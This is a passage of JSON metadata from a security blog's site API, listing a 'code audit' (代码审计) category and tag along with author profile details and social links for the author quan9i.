mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}